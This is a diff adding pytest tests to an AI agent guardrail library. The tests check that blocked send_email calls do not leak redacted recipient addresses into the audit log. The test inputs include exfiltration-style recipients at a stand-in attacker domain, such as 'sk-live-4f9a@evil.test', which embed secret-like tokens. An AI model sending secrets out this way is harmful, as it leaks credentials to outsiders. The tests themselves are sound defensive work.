@@ -2,6 +2,7 @@
 
 from __future__ import annotations
 
+import json
 from collections.abc import Callable
 from pathlib import Path
 from typing import Any
@@ -22,7 +23,7 @@ from agent_guardrails import (
     verify_log,
 )
 
-from .conftest import Backend
+from .conftest import EMAIL_POLICY, Backend, FakeClock
 
 MakeGuard = Callable[..., Guard]
 
@@ -281,3 +282,43 @@ def test_malformed_tool_names_are_blocked_under_any_default_mode(tmp_path: Path)
         assert outcome.reason is Reason.UNKNOWN_TOOL
     assert guard.pending() == []
     assert verify_log(guard.audit.path).ok
+
+
+def test_redacted_values_do_not_leak_through_block_details(
+    tmp_path: Path, clock: FakeClock
+) -> None:
+    # A deployment that treats recipients as personal data redacts `to`. A blocked
+    # call's detail must not then quote the address back into the audit log.
+    data = json.loads(json.dumps(EMAIL_POLICY))
+    data["tools"]["send_email"]["redact_fields"] = ["body", "to"]
+    guard = Guard(Policy.from_dict(data), home=tmp_path, clock=clock)
+    guard.register("send_email", lambda to, subject, body: None)
+    base = {"subject": "s", "body": "b"}
+
+    outside = guard.call("send_email", {**base, "to": ["sk-live-4f9a@evil.test"]})
+    assert outside.reason is Reason.RECIPIENT_NOT_ALLOWED
+    assert "sk-live-4f9a@evil.test" in outside.message  # the model sent it; it may see it
+    garbled = guard.call("send_email", {**base, "to": ["sk-live-77c1@example.com@evil.test"]})
+    assert garbled.reason is Reason.RECIPIENT_NOT_ALLOWED
+
+    queued = guard.call("send_email", {**base, "to": ["pat.private@example.com"]})
+    assert queued.action_id is not None
+    guard.approve(queued.action_id, by="alice")
+    data["tools"]["send_email"]["recipients"]["allowed_domains"] = ["example.org"]
+    guard.set_policy(Policy.from_dict(data))
+    closed = guard.execute_approved(queued.action_id)
+    assert closed.reason is Reason.RECIPIENT_NOT_ALLOWED
+
+    log = guard.audit.path.read_text()
+    for secret in ("sk-live-4f9a", "sk-live-77c1", "pat.private"):
+        assert secret not in log
+    assert verify_log(guard.audit.path).ok
+
+
+def test_redact_hook_values_do_not_leak_through_block_details(tmp_path: Path) -> None:
+    def hook(key: str, value: Any) -> Any:
+        return "<hidden>" if key == "to" else value
+
+    guard = Guard(Policy.from_dict(EMAIL_POLICY), home=tmp_path, redact_hook=hook)
+    guard.call("send_email", {"to": ["leak.me@evil.test"], "subject": "s", "body": "b"})
+    assert "leak.me" not in guard.audit.path.read_text()
